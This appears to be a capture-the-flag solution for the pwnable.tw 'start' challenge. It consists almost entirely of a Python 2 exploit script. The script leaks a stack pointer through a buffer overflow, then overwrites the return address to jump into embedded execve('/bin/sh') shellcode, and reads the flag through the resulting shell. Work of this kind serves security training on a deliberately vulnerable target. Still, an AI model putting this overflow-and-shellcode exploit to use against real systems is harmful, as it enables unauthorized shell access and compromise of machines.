## start
- reference
  - https://abda.nl/posts/2018/05/pwnable.tw-ctf-start/


```python
from socket import *
from struct import *

# connect and print banner
c = socket(AF_INET, SOCK_STREAM)
#c.connect(('127.0.0.1', 10100))
c.connect(('chall.pwnable.tw', 10000))
print c.recv(1000)

# leak esp
c.send('x' * 20 + pack('<I', 0x08048087))
esp = unpack('<I', c.recv(0x100)[:4])[0]
print 'esp = {0:08x}'.format(esp)

# set return address to stack shellcode.
payload = 'x' * 20
payload += pack('<I', esp + 20)
payload += '31c050682f2f7368682f62696e89e3505389e199b00bcd80'.decode('hex')

print 'payload length is {0}'.format(len(payload))
assert len(payload) < 60

c.send(payload)
c.send('cat /home/start/flag\n')
print c.recv(0x200)

```
